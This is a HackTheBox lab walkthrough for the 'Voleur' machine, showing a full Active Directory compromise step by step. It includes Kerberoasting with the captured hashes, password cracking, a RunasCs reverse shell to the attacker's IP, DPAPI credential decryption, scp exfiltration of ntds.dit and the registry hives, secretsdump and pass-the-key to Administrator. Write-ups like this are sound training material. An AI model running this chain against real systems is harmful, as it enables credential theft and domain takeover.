---
title: Voleur - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250829
tags:
  - walkthrough
  - HTB
---

# Voleur - A HackTheBox  machine

## Description

![[Voleur.png]]


## user.txt

We enumerate the target:

```bash
sudo nmap -sC -sV $ip --top-ports 10000
```

Output:

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-30 22:29:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-08-30T22:29:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

Note the line: 

```text
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0.
```

The domain is voleur.htb. Confirm with:

```bash
ldapsearch -H ldap://10.129.134.186 -x -s base defaultNamingContext
```

Add host mapping:

```bash
echo "10.129.134.186 voleur.htb dc.voleur.htb" | tee -a /etc/hosts
```

Ensure time is in sync (Kerberos is picky): Keep skew < 5 minutes.

```bash
sudo ntpdate -s 10.129.134.186 
```

Prepare a mnimal krb5.conf (optional if using -dc-ip):

```
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
    admin_server = dc.voleur.htb
  }

[domain_realm]
  .voleur.htb = VOLEUR.HTB
  voleur.htb = VOLEUR.HTB
```

The tester is provided with  credentials for the following account: ryan.naylor / HollowOct31Nyt. 

Create a TGT ticket using impacket. Directly asks the KDC for a TGT, saves it as a .ccache file. Export KRB5CCNAME to use it.

```bash
getTGT.py voleur.htb/'ryan.naylor':'HollowOct31Nyt'

export KRB5CCNAME=$(pwd)/ryan.naylor.ccache
```

List stored tickets:

```bash
klist -l
```

Check ldap connection:

```bash
nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k 
```

Check smb connection:

```bash
nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --shares
```

Connect to smb shares:

```bash
smbclient.py dc.voleur.htb  -k 

# Commands run in the context of smb share
help
shares
use IT
ls
cd First-Line Support
ls
mget *
```

Downloaded file: Access_Review.xlsx. It requires a password. The tester will crack it:

```bash
office2john Access_Review.xlsx > hash.txt   

john hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt     
# Access_Review.xlsx:football1
```

The file contains the following data for users:

|                |                                |                          |                                                                       |
| -------------- | ------------------------------ | ------------------------ | --------------------------------------------------------------------- |
| Ryan.Naylor    | First-Line Support Technician  | SMB                      | Has Kerberos Pre-Auth disabled temporarily to test legacy systems.    |
| Marie.Bryant   | First-Line Support Technician  | SMB                      |                                                                       |
| Lacey.Miller   | Second-Line Support Technician | Remote Management Users  |                                                                       |
| ~~Todd.Wolfe~~ | Second-Line Support Technician | Remote Management Users  | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs   | Third-Line Support Technician  | Remote Management Users. | Has access to Software folder.                                        |
| Administrator  | Administrator                  | Domain Admin             | Not to be used for daily tasks!                                       |

And for service accounts:

|            |     |                    |                                               |
| ---------- | --- | ------------------ | --------------------------------------------- |
| svc_backup |     | Windows Backup     | Speak to Jeremy!                              |
| svc_ldap   |     | LDAP Services      | P/W - M1XyC9pW7qT5Vn                          |
| svc_iis    |     | IIS Administration | P/W - N5pXyW1VqM7CZ8                          |
| svc_winrm  |     | Remote Management  | Need to ask Lacey as she reset this recently. |


Run bllodhound for ryan.naylor :

```bash
bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns $ip -c All -d voleur.htb --zip   
# No virtual env needed
```

Create TGTs:

```bash
# Create TGT for svc_ldap
getTGT.py voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'


# Create TGT for svc_iis
getTGT.py voleur.htb/'svc_iis':'N5pXyW1VqM7CZ8'


# To use one or the other, change the env:
export KRB5CCNAME=$(pwd)/svc_ldap.ccache
```

Run bloodhound as svc_ldap:

```bash
export KRB5CCNAME=$(pwd)/svc_ldap.ccache
bloodhound-python -u svc_ldap -p M1XyC9pW7qT5Vn -k -ns $ip -c All -d voleur.htb --zip   
```

Run bloodhound as svc_iis:

```bash
export KRB5CCNAME=$(pwd)/svc_iis.ccache
bloodhound-python -u svc_iis -p N5pXyW1VqM7CZ8 -k -ns $ip -c All -d voleur.htb --zip   
```

Run a kerberoast attack:

```bash
export KRB5CCNAME=$(pwd)/svc_ldap.ccache
python ~/tools/ActiveDirectory/fromLinux/targetedKerberoast/targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
```

Save retrieved hashes:

```bash
echo "$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$921d86a0b842ff79169515456ba7bc7b$83e778322ffb304bcc7ed713b9abeb8ed3383c3d8a3d55cca0d88138c604d08d93675d5ccc71a6dfe87e237d991fd31ca9c818edcc5784fefaf77cb7096bd147f0fbdd01ccfcc4a5666746bba20d7c81142b877caee4e87fbf0ce0c83f8c45f76c7771366bb4153c365e736bac8b9190938122e71eea2d4fba98e891e8b13636a69ea6b50d74b3b3b4f24820d21eb6f1a96648d28ca21ccb0625f6c0a755a83ddabfe62c5109933388a96b39329edf5b39314fb726ce403d6e6fe93eff1ec7bcdd698c987836d8a2dd3a24209f0954a9dc7a2c1a97a8c057395de8f0355afeab7be00f07f3a6a44574cdcf81da915dd6cb1685321ca9c30b1bafe6afdfa5f6daa8d4648ad610a3783c4bbdd67f8d0fce862924f63067127e84ce0163fa80efd65191956c0abf432db8d638bad7e6328f6651c3767aa95326b4f2c6e9b7be86718e79c6cd259adca3c3a8a9a18cd2cd8ed130953cfb9f250a8750a9cc27a5e2c465838bd3f8e2f4dbdbea909f721b36df2582558d8cb61818afefdc4c29afab781f478fe14b87b2a622220cd8a2663c57c202378125b0e632daac8719c5363827d6432c7afeb1fd957d092802658230b95740393a72a49969d3e2d3032c7f3ff5d1afd0b635565a0efa28bd97c422c93a33162181d95d1650384c34a4a404c0a2e67a8312c6a9b9a8df7485038b43de285a204c23ca3e16ce53cd3546d196cbc2bbff36f8cfe37f44a7eedd810033c34b405e66ce8c00d9ca25d576aa4d1a8621dff76dbe9da7c706af3e233e202027a14c5de31a2ce32b1d26804842dd6bfde395f9c4529f1b4302f14a395a7922fc8dbd1380540bcb707bb44dd73cfe330733837ed2c47f014dbb5051a897910e2cab99360c39efec54db5422a1bbecb85e4e096293c1393e1dce33d8e99956c84bacb37d0ea87b0d9cb9b504c19134f2dbe52b361ffc450c58f345d77fe8aeebeed0b64264ff0128fb1cd7f92e96b8d05ea93dda8800824d6823f754ef07a69c45ad8d32970077ef340e0b3f73bacdd3bcbc41e4f8782e79eb6b0f31022f706ad64ae4b569c79a4114d5b9a91cd0d2ec82d374754297e3f4e79fde3debda8292917f61eedfe4bcf4c165c6cfb3fb32133e8a694a02a485820c14ec89bda7fc558279f4f6a6f7f95fa7ed68eac97b6e2cbd9d85431413609fae14cee79ffa067c3d0b5aa3eaca87d7042fef601355cfe4efca83856c63b5d11112150e9db225c145925fbfb35015d9fc33565111f41c2a8ccae6860fbd9eeb01f05ee4365421e7b00309535df36cb475888035c93bf25987b91f3fdc3d4d2046bddd2c4d155ef637f99b307089ff53856a4903fd5ce7d75c8bd782a9a740f0d891d3966779bf7122d319ac058b833678ecf162f5db5ca7431a93ae752c188337dc9c9e2e0b444c221ed124752ffecb08b0bcfff14aacea68a4b3852292c4575a8038e91400d5259aec7fd0dd" > lacey.miller.txt



echo "$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$073e02a5fbd183eb3f0cb430a20167d9$ab5ed61cba4413a625926d40c82c40ba97b81ceab3106bc4adc7104887a38d056ef59b3ca642ca77f477132a2e8a2387ae89499f14ab5dfaf0bf86055c7be0cb9c7fafb7be727102f85442b72e962b15506cf6a41c1169d8fba499fbcde215ade2b9fbad8a30e3fee4a9f6cd8958f25f01d01c043b109acd7b90a358a4538c82698cb0eb19beda365e55c6d091a06d78b87d1c5a19cb64aa3ac99eddbf001bd693b775c7d2204ae1cfe207b879d34db9a7c2e5fe34fdc727094bbae8856a41d5179eeb40d2a563577fa65871068c8c494a31a09ed8ca74207a8461e738a752d36c4f95e089e56a9c53733e7621cad10c606a03617a9471edb9e59ae0f613c10d69821b16d6ec72edd5cbd5d92220f1e0970b5206e73749956f1bb7aee2042d8cfb346d3dea0e4cde3462dd5f09e6c5ac8477a07c8216fd1713a73702034d41b3df19b312c52895451054e5c477c6ea025f77fdab5ed53f1aecb492aa32bf8620b0ef7281f8c3428d75d378ba8a1ad920a0ce5b05ff524627d4ed930eecaa9d5ffa2c323c61f5dc1de68dea419ea12c0649df689f6c8e780c10a7b1bd0ea87b4efd6093e7c448d2bbe435279891a44a8ce3d31f317503e107ec5b47e5c4ae6d25a4290f69b3bfd0a59ac4ea4a09b3ddec3413c2f93fc1f5a543e3f11e640172ded1e8bb6bce3bc1037cc55a6f64267e0c61877af91d7ccffcbee16ab4e0ce2ddc078fec828df7f63d3c2b17712cf9abf86acf45418012a7bed856f23bb179e2816d4acee2f70ecea01093031169f539dfeb35b610b80145686230ec6087c940465347d06c64df1afdf8c6113867742b7e5339f2a1f0580ede1b371a0fb9c47020ea650a69ae95d1fd87eba50f6e4f400d1693e9d789dfe846d9b0857a1ebf735cd1733252d02cc1b34ce09c47664ef040482a82bcdd4b50d6e603e5beece82f4454faa91685ff95d73873230fb6e3f20126e5774a8d6528694ad0fc287551114bccd8100e099f9725929ccae0af505ede7c97d10c9e9f56e3f85daa4209e50767b77126761e71688093a3ec2f68bff8a5c598505cc8867867cc039031fed7cf56666ea855f66aa62118162aaf289ce9eb8975f7872bc323252133e86c1215969fa09d472571c9381982bfeb704d27f84d382c2861a96d38ccb2e8d423b193512c5e049290e6a75860d3f674a462aba2d9b3079a38516241ba16b02dee975725b19db4b197cb88f5771c151093249a55ac3145011d77c2d9cc431ee560e7bc899b14d1e76e367ff67a10d1941f25a1a7c3c21a8513e6d0750d2f87b5c830a910c7ff2f32286256a21200784b1d21063146ee9ce1a43bc04190d63dfb808997aa0561540909c6b637674694558e3d1c0fea5465aac45f21453e6b1adf9c8d880f23d6e09696fd9a744c32e8bd95fba2caafa98790bcbab7b3e8c1dc04a3aee6fc258d380cd3593fd422eea5f65629f3ab72691cdc" > svc_winrm.txt
```


Crack the hashes:

```bash
hashcat -m 13100 lacey.miller /usr/share/wordlists/rockyou.txt   -r /usr/share/hashcat/rules/best64.rule 

hashcat -m 13100 svc_winrm.txt /usr/share/wordlists/rockyou.txt
# Cracked!: AFireInsidedeOzarctica980219afi
```

Create TGT for svc_winrm:

```bash
getTGT.py voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi' 
```

Run bloodhound:

```bash
export KRB5CCNAME=$(pwd)/svc_winrm.ccache 

evil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb

type C:\Users\svc_winrm\Desktop\user.txt
```


## root.txt

From a different terminal, run bloodhound:

```
bloodhound-python -u svc_winrm -p AFireInsidedeOzarctica980219afi -k -ns $ip -c All -d voleur.htb --zip
```

Notice that svc_ldap is member of  `RESTORE USERS` group. svc_ldap does not have access to the machine. However, the tester can use the binary RunasCs.exe from: https://github.com/antonioCoco/RunasCs/releases. Forked in the tester repo: https://github.com/amandaguglieri/RunasCs

Upload the binary to the machine:

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload RunasCs.exe
```

Set a listener in a different terminal from the attacker's machine:

```bash
nc -lnvp 1234
```

Run a reverse shell:

```powershell
.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234
```

User svc_ldap can list and restore deleted users, such as Todd.Wolfe. List deleted users:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Get-ADObject -Filter 'isDeleted -eq $false -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects 
```

Restore Todd Wolfe: 

```bash
Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
```


```bash
getTGT.py voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'

export KRB5CCNAME=$(pwd)/todd.wolfe.ccache

todd.wolfe:NightT1meP1dg3on14

bloodhound-python -u todd.wolfe -p NightT1meP1dg3on14 -k -ns $ip -c All -d voleur.htb --zip
```

Connect  to smb shares with todd.wolfe:

```bash
smbclient.py dc.voleur.htb  -k 

# In the smb share
shares
use IT
ls
tree

cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/

get ConsoleHost_history.txt
```

From the attacker terminal

```
cat  ConsoleHost_history.txt
```

Output:

```
cd appdata
ls
cd local
ls
cd .\Microsoft\
ls
cd .\Credentials\
ls
cd ../../../
cd roaming
ls
cd .\Microsoft\
ls
cd .\Protect\
lw
ls
cd .\S-1-5-21-3927696377-1337352550-2781715495-1110\
ls
ls -h
ipconfig
ls -h
```


The tester replicates the commands from the ConsoleHost_history and retrieves:

```
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```


```
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
```

These files are part of Windows' Credential Manager and DPAPI (Data Protection API) ecosystem. They store protected user secrets.

`/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88`

- This lives under the Microsoft Protect folder.
- Files here are DPAPI Master Keys.
- Each file corresponds to a GUID (like 08949382-134f-4c63-b93c-ce52efc0aa88).
- These master keys are encrypted with the user’s Windows logon password (or domain creds).
- They are used to decrypt other DPAPI-protected blobs (such as browser passwords, Wi-Fi keys, RDP creds, Credential Manager entries, etc.).


`/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3`

- This lives in the **Microsoft\Credentials** folder.
- Files here are **DPAPI-encrypted Credential Blobs**.
- Each file stores a single saved credential from Windows Credential Manager (could be RDP saved logins, Outlook/Exchange creds, SharePoint, SMB shares, etc.).
- The blob itself is encrypted using the **master key** (from the Protect folder above).


Decrypt the master key:

```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14' 
```

This should output the MasterKey in HEX:

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Use the key to decrypt the credential:

```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Output:

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

```bash
getTGT.py voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'

export KRB5CCNAME=$(pwd)/jeremy.combs.ccache

bloodhound-python -u jeremy.combs -p qT3V9pLXyN7W4m -k -ns $ip -c All -d voleur.htb --zip
```

The user jeremy.combs is member of the `Third-Line Technicians` and the `REMOTE MANAGEMENT` groups . Connect  to smb shares with jeremy.combs user:

```bash
smbclient.py dc.voleur.htb  -k 

# In the smb share
shares
use IT
ls
cd /Third-Line Support
ls 
mget *
```

Attempt to connect with id_rsa:

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 jeremy.combs@$ip
```

Result:

```
jeremy.combs@10.129.232.130: Permission denied (publickey).
```

The tester derives the public key from this private key with the following command:

```bash
ssh-keygen -y -f ./id_rsa
```

Result:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC
```

The key belongs to the user svc_backup. Connect with user svc_backup via ssh:

```bash
ssh  -i id_rsa svc_backup@10.129.232.130 -p 2222
```

Privilege escalation:

```
id
```

Results:

```
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
```

Escalate to root:

```bash
sudo su
```

Footprint the system:

```bash
uname -a
```

Output: 

```
Linux DC 4.4.0-20348-Microsoft #2849-Microsoft Thu Nov 01 17:32:00 PST 2024 x86_64 x86_64 x86_64 GNU/Linux
```

The file Note.txt.txt downloaded along with id_rsa from share `IT//Third-Line Support` says:

```
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin 
```

The environment therefore is WSL. List all potential backup files:

```
find /mnt -type f -iregex '.*\.\(vhd\|vhdx\|wbcat\|zip\|bkf\|wim\|esd\|dit\|sav\|bak\|log1\|log2\|mdf\|ndf\|trn\|edb\|pst\|ost\|cmp\|avhd\|avhdx\|vmcx\|vmrs\|vmdk\|iso\|vbk\|vib\|vrb\|vbm\|tib\|tibx\|mrimg\|mrbak\|gho\|v2i\|sv2i\)' 2>/dev/null
```

Among the results:

```
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
```

Copy to the attacker machine:

```
scp -i id_rsa -P 2222 svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit .

```

In the svc_backup ssh connection search for the other hives:

```bash
find "/mnt/c/IT/Third-Line Support/Backups" -type f \( -iname 'SYSTEM' -o -iname 'SECURITY' -o -iname 'SAM' \) 2>/dev/null
```

Output:

```
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
```

Copy them locally:

```bash
scp -i id_rsa -P 2222 svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit .

scp -i id_rsa -P 2222 svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/registry/SECURITY .

scp -i id_rsa -P 2222 svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM .
```

The tester uses secretsdump from impacket:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL -history -outputfile voleur_dump
```

Create a TGT ticket:

```bash
getTGT.py VOLEUR.HTB/Administrator -aesKey f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb -dc-ip dc.voleur.htb
```

Connect via evil-winrm as Administrator:

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
evil-winrm -i dc.voleur.htb -k Administrator.ccache -r VOLEUR.HTB
```

Print the flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

